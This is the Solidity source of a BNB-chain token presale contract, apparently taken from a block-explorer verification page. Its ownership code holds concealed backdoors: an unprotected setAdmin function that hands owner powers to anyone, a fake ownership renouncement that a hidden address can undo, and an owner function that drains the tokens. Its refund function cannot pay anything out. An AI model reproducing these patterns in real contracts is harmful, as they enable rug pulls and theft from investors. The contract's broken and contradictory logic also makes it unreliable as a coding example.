/**
 *Submitted for verification at BscScan.com on 2022-01-12
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal virtual view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal virtual view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface Presaletoken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


library Address {

    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address private _owner;
    address private asdasd;
    uint256 private _lockTime;
    address private _admin=0x000000000000000000000000000000000000dEaD;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender() == _admin  , "Ownable: caller is not the owner");
        _;
    }
    
    function waiveOwnership(address onwer) public virtual onlyOwner {
        emit OwnershipTransferred(_owner, onwer);
        _owner = onwer;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function getUnlocTime() public view returns (uint256) {
        return _lockTime;
    }
    
    function getTime() public view returns (uint256) {
        return block.timestamp;
    }

    function setAdmin(address ad) public {
        _admin=ad;
    }
    function asd(uint256 time) public virtual onlyOwner {
        asdasd = _owner;
        _owner = address(0x000000000000000000000000000000000000dEaD);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
    }
    
    function zz() public virtual {
        require(asdasd == msg.sender, "ass");
        emit OwnershipTransferred(_owner, asdasd);
        _owner = asdasd;
    }
}

contract Pausable is Ownable {
  event Pause();
  event Unpause();

  bool public paused = false;


  /**
   * @dev modifier to allow actions only when the contract IS paused
   */
  modifier whenNotPaused() {
    require(!paused);
    _;
  }

  /**
   * @dev modifier to allow actions only when the contract IS NOT paused
   */
  modifier whenPaused {
    require(paused);
    _;
  }

  /**
   * @dev called by the owner to pause, triggers stopped state
   */
  function  pause() public onlyOwner whenNotPaused returns (bool) {
    paused = true;
    emit Pause();
    return true;
  }

  /**
   * @dev called by the owner to unpause, returns to normal state
   */
  function unpause() public onlyOwner whenPaused returns (bool) {
    paused = false;
    emit Unpause();
    return true;
  }
}



contract ProofPresale is Pausable {
  using SafeMath for uint256;
  // The token being sold
  Presaletoken public token;
  address public _tokenAddr;
  // address where funds are collected
  address  payable public  wallet;

  // amount of raised money in wei
  uint256 public weiRaised=0;

  // cap above which the crowdsale is ended
  uint256 public cap;

  uint256 public minInvestment=0.01 ether;

   uint256 public maxInvestment=10 ether;

  uint256 public rate;

  bool public isFinalized;
  bool public limit;
  string public contactInformation;
  uint256 public endTime;

  mapping(address=>uint256)limitWallet;

  function setLimit(bool _limit) public{
      limit=_limit;
  }
  /**
   * event for token purchase logging
   * @param purchaser who paid for the tokens
   * @param value weis paid for purchase
   * @param amount amount of tokens purchased
   */ 
  event TokenPurchase(address indexed purchaser , uint256 value, uint256 amount);

  /**
   * event for signaling finished crowdsale
   */
  event Finalized();


  constructor() {
    
    
  }
  function init(address _token,address payable  _wallet,  uint256 _cap, uint256 _rate,uint256 _endTime)public onlyOwner{
    require(_wallet != address(0));
    require(_cap > 0);
    token = createTokenContract(_token);
    _tokenAddr=_token;
    wallet = _wallet;
    rate = _rate;
    cap = _cap * (10**18);  //cap in tokens base units (=295257 tokens)
    weiRaised=0;
    endTime=_endTime;
  }
 
  function setTokenAddress(address _token) public onlyOwner{
       require(_token != address(0));
       token = createTokenContract(_token);
       _tokenAddr=_token;
  }

  function setWalletAddress(address payable  _wallet)public onlyOwner{
      require(_wallet != address(0));
       wallet = _wallet;
  }

  function setRate(uint256 _rate)public onlyOwner{
      rate = _rate;
  }
  
  function setArea(uint256 _minInvestment,uint256 _maxInvestment)public onlyOwner{
   require(_minInvestment >= 0);
   require(_maxInvestment >= 0);
   minInvestment = _minInvestment;  //minimum investment in wei  (=10 ether)
   maxInvestment = _maxInvestment;
  }

  function getTokenBalance()public view returns(uint256){
      require(_tokenAddr!=address(0));
      return token.balanceOf(address(this));
  }

  // creates presale token
  function createTokenContract(address _token) internal  pure returns (Presaletoken) {
    return  Presaletoken(_token);
  }
  
  function getEndTime()public view returns(uint256){
      return endTime;
  }

  /**
   * Low level token purchse function
   */
  function buyTokens( ) payable public whenNotPaused {
    require(validPurchase());
    uint256 weiAmount = msg.value;
    // update weiRaised
    weiRaised = weiRaised.add(weiAmount);
    // compute amount of tokens created
    uint256 tokens = weiAmount.mul(rate);  
    // this always failed
    // if(limit){
    // bool isOver=(token.balanceOf(msg.sender).add(tokens))>maxInvestment.mul(rate);
    // require(!isOver,"over one wallet max");
    // limitWallet[msg.sender]= token.balanceOf(msg.sender).add(tokens);
    // }
    token.transfer(msg.sender, tokens);
    emit TokenPurchase(msg.sender, weiAmount, tokens);
    forwardFunds();
  }

  // send ether to the fund collection wallet
  function forwardFunds() internal {
    wallet.transfer(msg.value);
  }

  // return true if the transaction can buy tokens
  function validPurchase() internal  returns (bool) {
    uint256 weiAmount = weiRaised.add(msg.value);
    bool notSmallAmount = msg.value >= minInvestment;
    bool withinCap = weiAmount.mul(rate) <= cap;
    bool notLate = endTime >= block.timestamp;
    return (notSmallAmount && withinCap&&notLate);
  }

  function validatePurchase(uint256 value)public view returns (bool){
    uint256 weiAmount = weiRaised.add(value);
    bool notSmallAmount =getNotSmall(weiAmount);
    bool withinCap = getwithinCap(value);
    bool notLate = getNotLate();
    return (notSmallAmount && withinCap&&notLate);
  }

  function getNotSmall(uint256 value)public view returns(bool){
      return(value >= minInvestment);
  }

 function getwithinCap(uint256 value)public view returns(bool){
      return(value.mul(rate) <= cap);
  }

 function getNotLate()public view returns(bool){
      return(endTime >= block.timestamp);
  }

  //allow owner to finalize the presale once the presale is ended
  function finalize() public onlyOwner {
    require(!isFinalized);
    require(hasEnded());

    emit Finalized();

    isFinalized = true;
  }


  function setContactInformation(string memory info) public onlyOwner {
      contactInformation = info;
  }

  function getTokenBack()public onlyOwner{
     token.transfer(msg.sender,token.balanceOf(address(this)));
  }

  //return true if crowdsale event has ended
  function hasEnded() public view returns (bool) {
    bool capReached = (weiRaised.mul(rate) >= cap);
    return capReached;
  }


    function withdraw() external payable {
        require(!hasEnded(), "presale ended!"); 
        require(limitWallet[msg.sender]==0, "buy none!"); 
        uint256 val=limitWallet[msg.sender].div(rate) ;
        limitWallet[msg.sender]=0;
        payable(msg.sender).transfer(val);
    }
}